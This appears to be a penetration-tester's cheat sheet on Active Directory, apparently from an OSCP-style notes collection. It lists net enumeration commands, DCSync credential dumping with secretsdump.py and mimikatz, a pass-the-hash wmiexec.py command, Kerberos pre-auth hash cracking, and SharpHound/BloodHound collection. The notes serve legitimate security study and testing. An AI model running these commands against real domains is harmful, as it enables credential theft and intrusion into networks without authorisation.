# Active Directoy

> Active Directory is a directory service developed by Microsoft for Windows domain networks. It is included in most Windows Server operating systems as a set of processes and services. Initially, Active Directory was only in charge of centralized domain management.   
>
> -- <cite>[Wikipedia](https://en.wikipedia.org/wiki/Active_Directory)</cite>

## Related

* [TCP 88: Kerberos](/11-services/01-tcp/TCP-88-Kerberos.md)
* [TCP 389, 636, 3268, 3269: LDAP](/11-services/01-tcp/TCP-389-636-3268-3269-LDAP.md)
* [Impacket](/13-misc/08-impacket.md)

## General

Display permissions using **PowerShell**
```bash
dsacls "DC=<domain>,DC=<domain>"
```

### net

List local accounts
```bash
net user
```

List domain accounts
```bash
net user /domain
```

Details about specific user
```bash
net user <user> /domain
```

List domain groups
```bash
net group /domain
```

Show domain's account policy
```bash
net accounts
```

## DC sync attack

[DC Sync Attacks With Secretsdump.py - YouTube](https://youtu.be/QfyZQDyeXjQ)  

```bash
secretsdump.py <domain>/<user>:<pw>@<ip>
```

```bash
wmiexec.py <domain>/<user>@<ip> -hashes "<hash>"
```

**Alternative approach** (probably gets flagged by AV)
Copy & execute `mimikatz.exe` on DC
```bash
lsadump::dcsync
```

## Pre-Auth attack

[Getting Passwords When Kerberos Pre-Auth IS Enabled - YouTube](https://www.youtube.com/watch?v=VLA7x81i5Pw)  
	1. sniff KRB auth packet  
	2. crack using hashcat  

-> If no pre auth is required, just use [Impacket](/13-misc/08-impacket.md) to pull hashes from AD.  

## BloodHound

BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory environment.  
[GitHub - BloodHoundAD/BloodHound](https://github.com/BloodHoundAD/BloodHound)

### Gather information (on target)

```bash
.\SharpHound.exe -c all -d <domain> --domain-controller <dc-ip>
```
Copy generated `*BloodHound.zip`

**Alternate approach**
```bash
SharpHound.ps1
Invoke-BloodHound -Domain <domain> -LDAPUser <user> -LDAPPass <pass> -CollectionMethod All -DomainController <dc-ip>
```

### Analyze data (on kali)

```bash
neo4j console
bloodhound
```

Connect to database
```bash
bolt://localhost:7687
neo4j
<PW>
```

Import data  
`Upload Data` select `.csv`, `.json` or `.zip` file(s)
